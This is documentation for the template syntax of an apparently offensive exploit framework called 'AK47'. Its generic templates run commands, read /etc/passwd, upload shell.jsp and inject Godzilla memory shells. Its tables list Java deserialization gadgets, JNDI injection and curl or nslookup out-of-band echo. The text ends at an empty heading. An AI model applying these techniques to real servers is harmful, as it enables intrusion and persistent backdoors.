# AK47 Syntax Documentation

## Table of Contents

1. [File Format](#file-format)
2. [Template Structure](#template-structure)
3. [Basic Syntax](#basic-syntax)
4. [Built-in Variables](#built-in-variables)
5. [Built-in Functions](#built-in-functions)
6. [Reference Examples](#reference-examples)
7. [Common Errors](#common-errors)

## File Format

Vulnerability templates are stored in the `plugin/` directory. The naming format is: `Product/VulnerabilityName#Type.yml`

```
plugin/
├── Shiro/
│   ├── shiro-550-aes-cbc#C.yml
│   └── shiro-550-aes-cbc#M.yml
├── VMware/
│   ├── vmware-vcenter-lfi#D.yml
│   ├── vmware-vcenter-log4j#C.yml
│   ├── vmware-vcenter-log4j#M.yml
│   └── vmware-vcenter-uploadova#U.yml
└── ...
```

**Type Description:**

- U - File Upload
- C - Command Execution
- D - File Download
- M - MemShell Injection

## Template Structure

### TCP

```yaml
# Plugin name
name: product-vuln-name

# Template type, options: ws | tcp | udp | http (default) | websocket
type: tcp

# Associated tags, used for search filtering
tags:
    - Tag1
    - Tag2

# Global variables, only for use within rules
vars:
    # Variable name: Expression
    Magic: hexdec(exploit.option.arg1)
    Param: Magic + exploit.download

# Default parameters, only the following parameters are allowed
default:
    # Custom parameters (exploit.option)
    arg1: "05060708"
    arg2: "..."
    arg3: "..."
    # At least one of the following types must be present
    # Command execution (exploit.command)
    method: tomcat,spring   # (Optional) Generally set for OOB or echo shell
    command: whoami
    # File download (exploit.download)
    download: /etc/passwd
    # File upload (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # Restrict memshell tool
    server: Tomcat,WebLogic # Restrict memshell server type
    method: Filter,Listener # Restrict memshell mounting method
    custom: "*.class"       # Restrict custom memshell file suffix

# Rule collection
rules:
    r0:
        request:
            body: "-"   # When body is "-", the response will be read directly
        # Rule matching expression
        expr: response.body.HasPrefix(Magic)
    r1:
        # Request template, only allows {{}} to populate variables rather than expressions
        request:
            body: "{{Param}}"
        # Rule matching expression
        expr: response.body.HasPrefix(Magic)
        # Output expression results when rule matches
        print:
            - string(response.body)[len(Magic):]

# Orchestrate rule flow via expression, result requires a boolean value
expr: r0() && r1()
```

### HTTP

```yaml
# Plugin name
name: product-vuln-name

# Template type, options: ws | tcp | udp | http (default) | websocket
type: http

# Associated tags, used for search filtering
tags:
    - Tag1
    - Tag2

# Global variables, only for use within rules
vars:
    # Variable name: Expression
    UUID: uuid()
    User: exploit.option.arg1
    Pass: exploit.option.arg2
    Command: format(`%s && echo %s`, exploit.command, UUID)

# Default parameters, only the following parameters are allowed
default:
    # Custom parameters (exploit.option)
    arg1: "admin"
    arg2: "123456"
    arg3: ""
    # At least one of the following types must be present
    # Command execution (exploit.command)
    method: tomcat,spring   # (Optional) Generally set for OOB or echo shell
    command: whoami
    # File download (exploit.download)
    download: /etc/passwd
    # File upload (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # Restrict memshell tool
    server: Tomcat,WebLogic # Restrict memshell server type
    method: Filter,Listener # Restrict memshell mounting method
    custom: "*.class"       # Restrict custom memshell file suffix

# Rule collection
rules:
    r0:
        # Request template, only allows {{}} to populate variables rather than expressions
        request:
            method: POST
            path: /login
            redirect: true
            body: "user={{User}}&pass={{Pass}}"
        # Rule matching expression
        expr: response.status == 200 && response.body.Has("token")
        # Extract content to set variables when rule matches, for use in subsequent rules
        vars:
            # Variable name: Expression
            Token: response.body.Submatch(`"token":"(.+?)"`)
    r1:
        # Request template, only allows {{}} to populate variables rather than expressions
        request:
            method: POST
            path: /exec
            headers:
                Token: "{{Token}}"
                Content-Type: application/x-www-form-urlencoded
            body: "cmd={{Command}}"
        # Rule matching expression
        expr: response.status == 200 && response.body.Has(UUID)
        # Output expression results when rule matches
        print:
            - 'format("Token: %s", Token)'
            - response.body.Truncate(UUID)

# Orchestrate rule flow via expression, result requires a boolean value
expr: r0() && r1()
```

### WebSocket

```yaml
# Plugin name
name: product-vuln-name

# Template type, options: ws | tcp | udp | http (default) | websocket
type: websocket

# Associated tags, used for search filtering
tags:
    - Tag1
    - Tag2

# Global variables, only for use within rules
vars:
    # Variable name: Expression
    Path: '"/v1/ws"' # WebSocket request path, requires an extra layer of wrapping to ensure it's a string and avoid the error: unexpected token Operator("/")
    Shell: base64(exploit.upload.content)

# Default parameters, only the following parameters are allowed
default:
    # Custom parameters (exploit.option)
    arg1: "..."
    arg2: "..."
    arg3: "..."
    # At least one of the following types must be present
    # Command execution (exploit.command)
    method: tomcat,spring   # (Optional) Generally set for OOB or echo shell
    command: whoami
    # File download (exploit.download)
    download: /etc/passwd
    # File upload (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # Restrict memshell tool
    server: Tomcat,WebLogic # Restrict memshell server type
    method: Filter,Listener # Restrict memshell mounting method
    custom: "*.class"       # Restrict custom memshell file suffix

# Rule collection
rules:
    r0:
        request:
            body: "-"   # When body is "-", the response will be read directly
        # Rule matching expression
        expr: response.body.Has("token")
        # Extract content to set variables when rule matches, for use in subsequent rules
        vars:
            # Variable name: Expression
            Token: response.body.Submatch(`"token":"(.+?)"`)
    r1:
        # Request template, only allows {{}} to populate variables rather than expressions
        request:
            method: Text    # Supports Text, Ping, Pong, Close, Binary
            body: |
                {"file":"{{Shell}}","token":"{{Token}}"}
        # Rule matching expression
        expr: response.body.Has("success")
        # Output expression results when rule matches
        print:
            - 'format("Token: %s", Token)'
            - response.body.Submatch(`"path":"(.+?)"`)

# Orchestrate rule flow via expression, result requires a boolean value
expr: r0() && r1()
```

## Basic Syntax

### Literals

| Type        | Example                             |
| ----------- | ----------------------------------- |
| **Comment** | `/* */` or `//`                     |
| **Boolean** | `true`, `false`                     |
| **Integer** | `42`, `0x2A`, `0o52`, `0b101010`    |
| **Float**   | `0.5`, `.5`                         |
| **String**  | `"foo"`, `'bar'`, `` `multiline` `` |
| **Array**   | `[1, 2, 3]`                         |
| **Object**  | `{a: 1, b: 2}`                      |
| **Null**    | `nil`                               |

### Operators

| Type           | Operator                                    |
| -------------- | ------------------------------------------- |
| **Arithmetic** | `+`, `-`, `*`, `/`, `%`, `^` or `**`        |
| **Comparison** | `==`, `!=`, `<`, `>`, `<=`, `>=`            |
| **Logical**    | `!` or `not`, `&&` or `and`, `\|\|` or `or` |
| **Condition**  | `? :`, `??`, `if {} else {}`                |
| **Member**     | `.`, `[]`, `?.`, `in`                       |
| **String**     | `+`, `contains`, `startsWith`, `endsWith`   |
| **Regex**      | `matches`                                   |
| **Range**      | `..`                                        |
| **Slice**      | `[:]`                                       |
| **Pipe**       | `\|`                                        |

### Variables

```expr
let x = 42; x * 2

let x = 42; 
let y = 2; 
x * y

let name = user.Name | lower() | split(" "); 
"Hello, " + name[0] + "!"
```

### Member Access

```expr
user.Name == user["Name"]

author.User?.Name or author.User != nil ? author.User.Name : nil

author.User?.Name ?? "Anonymous" or author.User != nil ? author.User.Name : "Anonymous"
```

### Slices

```expr
array[1:4] == [2, 3, 4]
array[1:-1] == [2, 3, 4]
array[:3] == [1, 2, 3]
array[3:] == [4, 5]
array[:] == array
```

### Pipes

```expr
user.Name | lower() | split(" ") == split(lower(user.Name), " ")
```

### Ranges

```expr
1..3 == [1, 2, 3]
```

### Predicates

A predicate is an expression that can be used in functions like filter, all, any, one, none, etc.

```expr
filter(0..9, {# % 2 == 0}) == [0, 2, 4, 6, 8]
filter(tweets, {len(.Content) > 240}) or filter(tweets, len(.Content) > 240)
```

## Built-in Variables

### config

| Property         | Description    | Example                          |
| ---------------- | -------------- | -------------------------------- |
| `config.mode`    | Proxy mode     | `"auto"`,`"direct"`,`"global"`   |
| `config.proxy`   | Proxy address  | `"socks5://127.0.0.1:1080"`      |
| `config.buffer`  | Buffer size    | `1048576`                        |
| `config.timeout` | Timeout        | `10`                             |
| `config.headers` | Global headers | `["X-Forwarded-For: 127.0.0.1"]` |

### exploit

**option** - Custom parameters

| Property              | Description        |
| --------------------- | ------------------ |
| `exploit.option.arg1` | Custom parameter 1 |
| `exploit.option.arg2` | Custom parameter 2 |
| `exploit.option.arg3` | Custom parameter 3 |

**download** - File download

| Property           | Description   | Example         |
| ------------------ | ------------- | --------------- |
| `exploit.download` | Download path | `"/etc/passwd"` |

**upload** - File upload

| Property                 | Description  | Example                     |
| ------------------------ | ------------ | --------------------------- |
| `exploit.upload.local`   | Local path   | `"/User/Desktop/shell.txt"` |
| `exploit.upload.remote`  | Remote path  | `"/var/www/html/shell.jsp"` |
| `exploit.upload.content` | File content | `"<%@ page ...%>"`          |

**command** - Command execution

| Property                  | Description               | Example                              |
| ------------------------- | ------------------------- | ------------------------------------ |
| `exploit.command.type`    | Execution type            | `"Command"`,`"ByteCode"`             |
| `exploit.command.class`   | Echo shell class name     | `"com.example.Main"`                 |
| `exploit.command.format`  | Echo shell format         | `"BCEL"`, `"Class"`, `"Base64"`, ... |
| `exploit.command.header`  | Echo shell request header | `"X-Access-Token"`                   |
| `exploit.command.bypass`  | Bypass module limits      | `false`                              |
| `exploit.command.method`  | OOB / Echo method         | `"curl"`, `"tomcat"`                 |
| `exploit.command.command` | Execute specified command | `"whoami"`                           |

`exploit.command.method` supports the following:

- Echo shell: `bes`, `resin`, `jboss`, `jetty`, `apusic`, `tomcat`, `tongweb`, `weblogic`, `undertow`, `spring`, `glassfish`, `websphere`, `inforsuite`
- OOB Echo: `curl`, `ping`, `nslookup`

| Method                                 | Description                  | Example                                                                                                    |
| -------------------------------------- | ---------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `exploit.command.Set(key, value, ...)` | Set command property         | `exploit.command.Set("bypass", true, "header", "X-API-Key")`                                               |
| `exploit.command.OOB(os?)`             | Out-of-band echo command     | `exploit.command.OOB("windows")`                                                                           |
| `exploit.command.Msp(format)`          | Echo command payload         | `exploit.command.Msp("SpEL")`                                                                              |
| `exploit.command.Yso(gadget)`          | Java deserialization payload | `exploit.command.Yso("CommonsBeanutils1")`                                                                 |
| `exploit.command.JNDI(scheme, gadget)` | JNDI injection link          | `exploit.command.JNDI("ldap", "CommonsBeanutils1")`                                                        |
| `exploit.command.Chains(cli)`          | Java-Chains payload          | `exploit.command.Chains("-p JavaNativePayload -s /CommonsBeanutils1/TemplatesImpl2/BytecodeFromBase64/x")` |

`exploit.command.Msp` `format` supports the following:

`AbstractTranslet`, `Aviator`, `Base64`, `Base64URLEncoded`, `BCEL`, `BeanShell`, `BigInteger`, `Class`, `ClassLoaderJSP`, `ClassLoaderJSPUnicode`, `DefaultBase64`, `DefaultScriptEngine`, `DefineClassJSP`, `DefineClassJSPUnicode`, `EL`, `Freemarker`, `Groovy`, `GroovyClassDefiner`, `GroovyScriptEngine`, `GzipBase64`, `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode`, `Hessian2Deserialize`, `Hessian2XSLTScriptEngine`, `HessianDeserialize`, `HessianXSLTScriptEngine`, `JavaCommonsBeanutils110`, `JavaCommonsBeanutils16`, `JavaCommonsBeanutils17`, `JavaCommonsBeanutils18`, `JavaCommonsBeanutils19`, `JavaCommonsCollections3`, `JavaCommonsCollections4`, `JavaDeserialize`, `JDKAbstractTransletPacker`, `JEXL`, `JinJava`, `JSP`, `JSPX`, `JSPXUnicode`, `JXPath`, `JXPathScriptEngine`, `JXPathSpringGzip`, `JXPathSpringGzipJDK17`, `MVEL`, `OGNL`, `OGNLScriptEngine`, `OGNLSpringGzip`, `OGNLSpringGzipJDK17`, `OracleAbstractTransletPacker`, `Rhino`, `ScriptEngine`, `ScriptEngineBigInteger`, `ScriptEngineNoSquareBrackets`, `SpEL`, `SpELScriptEngine`, `SpELSpringGzip`, `SpELSpringGzipJDK17`, `Velocity`, `XalanAbstractTransletPacker`, `XMLDecoder`, `XMLDecoderDefineClass`, `XMLDecoderScriptEngine`

Special note: `exploit.command.Msp`, `exploit.command.Yso`, `exploit.command.JNDI`, and `exploit.command.Chains` require a request header. The default header name is `X-Access-Token`, and it can be changed with `exploit.command.Set("header", "X-API-Key")`.

**memshell** - MemShell Injection

| Property                  | Description          | Example                              |
| ------------------------- | -------------------- | ------------------------------------ |
| `exploit.memshell.tool`   | MemShell tool        | `"Godzilla"`                         |
| `exploit.memshell.server` | Server type          | `"Tomcat"`                           |
| `exploit.memshell.method` | Mount method         | `"Filter"`                           |
| `exploit.memshell.path`   | Connection path      | `"/assets/favicon.ico"`              |
| `exploit.memshell.key`    | Connection key       | `"key"`                              |
| `exploit.memshell.pass`   | Connection password  | `"pass"`                             |
| `exploit.memshell.header` | Request header       | `"Referer"`                          |
| `exploit.memshell.value`  | Request header value | `"/v1/user/x"`                       |
| `exploit.memshell.class`  | Injector class name  | `"com.example.Main"`                 |
| `exploit.memshell.format` | MemShell format      | `"BCEL"`, `"Class"`, `"Base64"`, ... |
| `exploit.memshell.bypass` | Bypass module limits | `false`                              |
| `exploit.memshell.custom` | Custom MemShell      | `"/User/Desktop/shell.class"`        |

| Method                                  | Description                  | Example                                                                                                     |
| --------------------------------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------- |
| `exploit.memshell.Set(key, value, ...)` | Set MemShell property        | `exploit.memshell.Set("bypass", true)`                                                                      |
| `exploit.memshell.Msp(format)`          | MemShell payload             | `exploit.memshell.Msp("Freemarker")`                                                                        |
| `exploit.memshell.Yso(gadget)`          | Java deserialization payload | `exploit.memshell.Yso("CommonsBeanutils1")`                                                                 |
| `exploit.memshell.JNDI(scheme, gadget)` | JNDI injection link          | `exploit.memshell.JNDI("ldap", "CommonsBeanutils1")`                                                        |
| `exploit.memshell.Print(data?)`         | Output injection result      | `exploit.memshell.Print(response.body)`                                                                     |
| `exploit.memshell.Chains(cli)`          | Java-Chains payload          | `exploit.memshell.Chains("-p JavaNativePayload -s /CommonsBeanutils1/TemplatesImpl2/BytecodeFromBase64/x")` |

`exploit.memshell.Msp` `format` supports the following:

`AbstractTranslet`, `AgentJar`, `AgentJarWithJDKAttacher`, `AgentJarWithJREAttacher`, `Aviator`, `Base64`, `Base64URLEncoded`, `BCEL`, `BeanShell`, `BigInteger`, `Class`, `ClassLoaderJSP`, `ClassLoaderJSPUnicode`, `DefaultBase64`, `DefaultScriptEngine`, `DefineClassJSP`, `DefineClassJSPUnicode`, `EL`, `Freemarker`, `Groovy`, `GroovyClassDefiner`, `GroovyScriptEngine`, `GroovyTransformJar`, `GzipBase64`, `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode`, `Hessian2Deserialize`, `Hessian2XSLTScriptEngine`, `HessianDeserialize`, `HessianXSLTScriptEngine`, `Jar`, `JavaCommonsBeanutils110`, `JavaCommonsBeanutils16`, `JavaCommonsBeanutils17`, `JavaCommonsBeanutils18`, `JavaCommonsBeanutils19`, `JavaCommonsCollections3`, `JavaCommonsCollections4`, `JavaDeserialize`, `JDKAbstractTransletPacker`, `JEXL`, `JinJava`, `JSP`, `JSPX`, `JSPXUnicode`, `JXPath`, `JXPathScriptEngine`, `JXPathSpringGzip`, `JXPathSpringGzipJDK17`, `MVEL`, `OGNL`, `OGNLScriptEngine`, `OGNLSpringGzip`, `OGNLSpringGzipJDK17`, `OracleAbstractTransletPacker`, `Rhino`, `ScriptEngine`, `ScriptEngineBigInteger`, `ScriptEngineJar`, `ScriptEngineNoSquareBrackets`, `SpEL`, `SpELScriptEngine`, `SpELSpringGzip`, `SpELSpringGzipJDK17`, `Velocity`, `XalanAbstractTransletPacker`, `XMLDecoder`, `XMLDecoderDefineClass`, `XMLDecoderScriptEngine`, `XxlJob`

### request

| Property               | Description       | Example                                      |
| ---------------------- | ----------------- | -------------------------------------------- |
| `request.url.scheme`   | Protocol          | `"ws"`, `"tcp"`, `"http"`, ...               |
| `request.url.host`     | Host + port       | `"example.com:8080"`                         |
| `request.url.domain`   | IP / Domain       | `"127.0.0.1"`, `"example.com"`               |
| `request.url.port`     | Port number       | `"8080"`                                     |
| `request.url.path`     | Resource path     | `"/api/v1"`                                  |
| `request.url.query`    | Query parameters  | `"id=1"`                                     |
| `request.url.fragment` | Fragment / Anchor | `"section"`                                  |
| `request.method`       | Request method    | `"GET"`, `"POST"`                            |
| `request.path`         | Request path      | `"/api/v1"`                                  |
| `request.body`         | Request content   | `"username=admin&password=123456"`           |
| `request.headers`      | Request headers   | `{"Authorization":"Basic YWRtaW46MTIzNDU2"}` |
| `request.redirect`     | Follow redirects  | `true`                                       |

| Method                  | Description | Example                     |
| ----------------------- | ----------- | --------------------------- |
| `request.url.BaseURL()` | Base URL    | `"http://example.com:8080"` |

### response

| Property                | Description      | Example                            |
| ----------------------- | ---------------- | ---------------------------------- |
| `response.status`       | Status code      | `200`, `404`, `500`, ...           |
| `response.cookie`       | Cookie value     | `"uid=001; sess=202cb962ac59075b"` |
| `response.header`       | Resp header(str) | `"Content-Type: text/html\r\n"`    |
| `response.headers`      | Resp header(map) | `{"content-type":"text/html"}`     |
| `response.body`         | Response content | `"<html>..."`                      |
| `response.title`        | Page title       | `"Welcome"`                        |
| `response.raw_body`     | Raw response     | `"<html>..."`                      |
| `response.content_type` | Content type     | `"text/html"`                      |

### advanced

In `request` and `response`, except for `request.redirect` and `response.status`, the following methods are supported:

| Method                   | Description                     | Example                                 |
| ------------------------ | ------------------------------- | --------------------------------------- |
| `*.Has(sub)`             | Contains substring              | `response.body.Has("success")`          |
| `*.HasPrefix(prefix)`    | Starts with prefix              | `response.body.HasPrefix("{")`          |
| `*.HasSuffix(suffix)`    | Ends with suffix                | `response.body.HasSuffix("}")`          |
| `*.Match(regex)`         | Matches regex                   | `response.body.Match("\\d+")`           |
| `*.Submatch(regex)`      | Extract first capture group     | `response.body.Submatch("token=(.+?)")` |
| `*.Truncate(sub)`        | Truncate before substring       | `response.body.Truncate("<!DOCTYPE")`   |
| `*.ReplaceAll(old, new)` | Replace all matching substrings | `response.body.ReplaceAll("\\n", "\n")` |

## Built-in Functions

### Strings

#### format(format, arg1[, ...])

Outputs a string based on the specified format and arguments.

```expr
format("Hello %s %d", "World", 2026) == "Hello World 2026"
```

#### strrev(str)

Reverses the string `str`.

```expr
strrev("hello") == "olleh"
```

#### unicode(str)

Converts the string `str` to a Unicode escape sequence.

```expr
unicode("hi") == "\u0068\u0069"
```

#### trim(str[, chars])

Removes leading and trailing whitespace from the string `str`. If the optional parameter `chars` is provided, removes the specified characters instead.

```expr
trim("  Hello  ") == "Hello"
trim("__Hello__", "_") == "Hello"
```

#### trimPrefix(str, prefix)

Removes the specified `prefix` from the string `str` if it starts with it.

```expr
trimPrefix("HelloWorld", "Hello") == "World"
```

#### trimSuffix(str, suffix)

Removes the specified `suffix` from the string `str` if it ends with it.

```expr
trimSuffix("HelloWorld", "World") == "Hello"
```

#### upper(str)

Converts all characters in the string `str` to uppercase.

```expr
upper("hello") == "HELLO"
```

#### lower(str)

Converts all characters in the string `str` to lowercase.

```expr
lower("HELLO") == "hello"
```

#### split(str, delimiter[, n])

Splits the string `str` based on the specified `delimiter`.

```expr
split("apple,orange,grape", ",") == ["apple", "orange", "grape"]
split("apple,orange,grape", ",", 2) == ["apple", "orange,grape"]
```

#### splitAfter(str, delimiter[, n])

Splits the string `str` based on the specified `delimiter`, keeping the delimiter in the resulting array elements.

```expr
splitAfter("apple,orange,grape", ",") == ["apple,", "orange,", "grape"]
splitAfter("apple,orange,grape", ",", 2) == ["apple,", "orange,grape"]
```

#### replace(str, old, new)

Replaces all occurrences of `old` with `new` in the string `str`.

```expr
replace("Hello World", "World", "Universe") == "Hello Universe"
```

#### repeat(str, n)

Repeats the string `str` `n` times.

```expr
repeat("Hi", 3) == "HiHiHi"
```

#### indexOf(str, substring)

Returns the index of the first occurrence of `substring` in string `str`, or -1 if not found.

```expr
indexOf("apple pie", "pie") == 6
```

#### lastIndexOf(str, substring)

Returns the index of the last occurrence of `substring` in string `str`, or -1 if not found.

```expr
lastIndexOf("apple pie apple", "apple") == 10
```

#### hasPrefix(str, prefix)

Returns `true` if the string `str` starts with the given `prefix`.

```expr
hasPrefix("HelloWorld", "Hello") == true
```

#### hasSuffix(str, suffix)

Returns `true` if the string `str` ends with the given `suffix`.

```expr
hasSuffix("HelloWorld", "World") == true
```

### Encryption and Decryption

#### md5(v)

Computes the MD5 hash of the data and returns a lowercase hexadecimal string.

```expr
md5("hello") == "5d41402abc4b2a76b9719d911017c592"
```

#### sha(alg, v)

Computes the SHA hash of the data using the specified algorithm (sha1, sha224, sha256, sha384, sha512), returning a lowercase hexadecimal string.

```expr
sha("sha256", "hello") == "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
```

#### sm3(v)

Computes the SM3 hash of the data, returning a lowercase hexadecimal string.

```expr
sm3("hello") == "becbbfaae6548b8bf0cfcad5a27183cd1be6093b1cceccc303d9c61d0a645268"
```

#### xor(key, v)

Performs a XOR operation on the given data.

```expr
xor("key", "hello") == "\x00\x04\x1d\x0a"
```

#### jwt(alg, key, v)

Generates a JWT string based on the specified algorithm, key, and data.

```expr
jwt("HS256", "secret", `{"sub": "1234567890", "name": "John", "iat": 1516239022}`) == "eyJhbGciOiJIUzI1NiIsInR5cCI..."
```

#### hmac(alg, key, v)

Computes the HMAC hash of the data using the specified algorithm (md5, sha1, sha224, sha256, sha384, sha512) and key, returning a hexadecimal string.

```expr
hmac("sha256", "123456", "hello") == "ac28d602c767424d0c809edebf73828bed5ce99ce1556f4df8e223faeec60edd"
```

#### aes(mode, key, iv, v) / toAES(mode, key, iv, v)

Encrypts data using the AES algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`.

```expr
aes("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toAES("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### des(mode, key, iv, v) / toDES(mode, key, iv, v)

Encrypts data using the DES algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`.

```expr
des("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toDES("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### sm4(mode, key, iv, v) / toSM4(mode, key, iv, v)

Encrypts data using the SM4 algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`.

```expr
sm4("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toSM4("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### rsa(key, v) / toRSA(key, v)

Encrypts data using an RSA public or private key.

```expr
rsa("-----BEGIN PUBLIC KEY-----...", "hello 123") == "\x10\xb2\x91\x8c..."
toRSA("-----BEGIN PRIVATE KEY-----...", "hello 321") == "\x80\xf4\xc2\xa6..."
```

#### sm2(key, v, mode?) / toSM2(key, v, mode?)

Encrypts data using an SM2 public or private key.

Supported `mode`s are:

- C1C3C2
- C1C2C3

```expr
sm2("-----BEGIN PUBLIC KEY-----...", "hello 123", "C1C3C2") == "\x10\xb2\x91\x8c..."
toSM2("-----BEGIN PRIVATE KEY-----...", "hello 321", "C1C3C2") == "\x80\xf4\xc2\xa6..."
```

#### fromAES(mode, key, iv, v)

Decrypts data using the AES algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`.

```expr
fromAES("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromDES(mode, key, iv, v)

Decrypts data using the DES algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`.

```expr
fromDES("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromSM4(mode, key, iv, v)

Decrypts data using the SM4 algorithm, supporting `ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`.

```expr
fromSM4("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromRSA(key, v)

Decrypts data using an RSA public or private key.

```expr
fromRSA("-----BEGIN PUBLIC KEY-----...", "\x80\xf4\xc2\xa6...") == "hello 321"
fromRSA("-----BEGIN PRIVATE KEY-----...", "\x10\xb2\x91\x8c...") == "hello 123"
```

#### fromSM2(key, v, mode?)

Decrypts data using an SM2 private key.

Supported `mode`s are:

- C1C3C2
- C1C2C3

```expr
fromSM2("-----BEGIN PRIVATE KEY-----...", "\x10\xb2\x91\x8c...", "C1C3C2") == "hello 123"
```

### Encoding and Decoding

#### bcel(v)

Encodes Java bytecode into BCEL format.

```expr
bcel("\xca\xfe\xba\xbe...") == "$$BCEL$$..."
```

#### hex(v) / toHex(v)

Encodes data into a hexadecimal string.

```expr
hex("hello") == "68656c6c6f"
toHex("hello") == "68656c6c6f"
```

#### hexdec(v) / fromHex(v)

Decodes a hexadecimal string.

```expr
hexdec("68656c6c6f") == "hello"
fromHex("68656c6c6f") == "hello"
```

#### base64(v) / toBase64(v)

Encodes data into a Base64 string.

```expr
base64("Hello World") == "SGVsbG8gV29ybGQ="
toBase64("Hello World") == "SGVsbG8gV29ybGQ="
```

#### b64dec(v) / fromBase64(v)

Decodes a Base64 string.

```expr
b64dec("SGVsbG8gV29ybGQ=") == "Hello World"
fromBase64("SGVsbG8gV29ybGQ=") == "Hello World"
```

#### urlencode(v)

URL-encodes the given data.

```expr
urlencode("hello world") == "hello+world"
```

#### urldecode(v)

Decodes URL-encoded data.

```expr
urldecode("hello+world") == "hello world"
```

### Mathematical Calculations

#### len(v)

Returns the length of an array, string, or object.

```expr
len([1, 2, 3]) == 3
len({"name": "John", "age": 30}) == 2
len("Hello") == 5
```

#### max(n1, n2)

Returns the larger of two numbers.

```expr
max(5, 7) == 7
```

#### min(n1, n2)

Returns the smaller of two numbers.

```expr
min(5, 7) == 5
```

#### abs(n)

Returns the absolute value of a number.

```expr
abs(-5) == 5
```

#### ceil(n)

Rounds a number up to the nearest integer.

```expr
ceil(1.5) == 2.0
```

#### floor(n)

Rounds a number down to the nearest integer.

```expr
floor(1.5) == 1.0
```

#### round(n)

Rounds a number to the nearest integer.

```expr
round(1.5) == 2.0
```

### Array Methods

#### all(array, predicate)

Returns `true` if all elements in the array satisfy the predicate condition.

```expr
all([2, 4, 6], {# % 2 == 0}) == true
```

#### any(array, predicate)

Returns `true` if any element in the array satisfies the predicate condition.

```expr
any([1, 2, 3], {# > 2}) == true
```

#### one(array, predicate)

Returns `true` if exactly one element in the array satisfies the predicate condition.

```expr
one([1, 2, 3], {# == 1}) == true
```

#### none(array, predicate)

Returns `true` if none of the elements in the array satisfy the predicate condition.

```expr
none([1, 2, 3], {# > 5}) == true
```

#### map(array, predicate)

Applies a predicate to each element in the array and returns a new array.

```expr
map([1, 2, 3], {# * 2}) == [2, 4, 6]
```

#### filter(array, predicate)

Filters the array elements based on the predicate condition and returns a new array.

```expr
filter([1, 2, 3, 4], {# > 2}) == [3, 4]
```

#### find(array, predicate)

Finds the first element in the array that satisfies the predicate condition.

```expr
find([1, 2, 3, 4], {# > 2}) == 3
```

#### findIndex(array, predicate)

Finds the index of the first element in the array that satisfies the predicate condition.

```expr
findIndex([1, 2, 3, 4], {# > 2}) == 2
```

#### findLast(array, predicate)

Finds the last element in the array that satisfies the predicate condition.

```expr
findLast([1, 2, 3, 4], {# > 2}) == 4
```

#### findLastIndex(array, predicate)

Finds the index of the last element in the array that satisfies the predicate condition.

```expr
findLastIndex([1, 2, 3, 4], {# > 2}) == 3
```

#### groupBy(array, predicate)

Groups the array elements based on the result of the predicate.

```expr
groupBy(users, .Age) == {20: [...], 30: [...]}
```

#### count(array[, predicate])

Returns the number of elements that satisfy the predicate condition.

```expr
count([1, 2, 3, 4], {# > 2}) == 2
```

#### concat(array1, array2[, ...])

Concatenates two or more arrays.

```expr
concat([1, 2], [3, 4]) == [1, 2, 3, 4]
```

#### flatten(array)

Flattens a given array into a one-dimensional array.

```expr
flatten([1, 2, [3, 4]]) == [1, 2, 3, 4]
```

#### uniq(array)

Removes duplicate items from the array.

```expr
uniq([1, 2, 3, 2, 1]) == [1, 2, 3]
```

#### join(array[, delimiter])

Joins the array into a string using the provided delimiter.

```expr
join(["apple", "orange", "grape"]) == "appleorangegrape"
join(["apple", "orange", "grape"], ",") == "apple,orange,grape"
```

#### reduce(array, predicate[, initialValue])

Applies the predicate to each element in the array, reducing the array to a single value. The initial accumulator value can be provided via `initialValue`; otherwise, the first element of the array is used as the initial value.

Variables available within the predicate:

- `#` - Current element
- `#acc` - Accumulator
- `#index` - Current element index

```expr
reduce(1..9, #acc * #) == 362880
reduce(1..9, #acc * #, 0) == 0
```

#### sum(array[, predicate])

Returns the sum of all numbers in the array.

```expr
sum([1, 2, 3]) == 6
```

#### mean(array)

Returns the mean of all numbers in the array.

```expr
mean([3, 6, 18]) == 9.0
```

#### median(array)

Returns the median of all numbers in the array.

```expr
median([2, 5, 7]) == 5
```

#### first(array)

Returns the first element of the array.

```expr
first([1, 2, 3]) == 1
```

#### last(array)

Returns the last element of the array.

```expr
last([1, 2, 3]) == 3
```

#### take(array, n)

Returns the first `n` elements of the array.

```expr
take([1, 2, 3, 4], 2) == [1, 2]
```

#### reverse(array)

Returns a reversed copy of the array.

```expr
reverse([3, 1, 4]) == [4, 1, 3]
reverse(reverse([3, 1, 4])) == [3, 1, 4]
```

#### sort(array[, order])

Sorts the array in ascending order; can be set to ascending or descending using `order`.

Supported `order`s are:

- asc
- desc

```expr
sort([3, 1, 4]) == [1, 3, 4]
sort([3, 1, 4], "desc") == [4, 3, 1]
```

#### sortBy(array[, predicate, order])

Sorts the array based on the result of the predicate; can be set to ascending or descending using `order`.

Supported `order`s are:

- asc
- desc

```expr
sortBy(users, .Age)
sortBy(users, .Age, "desc")
```

### Random Generation

#### uuid()

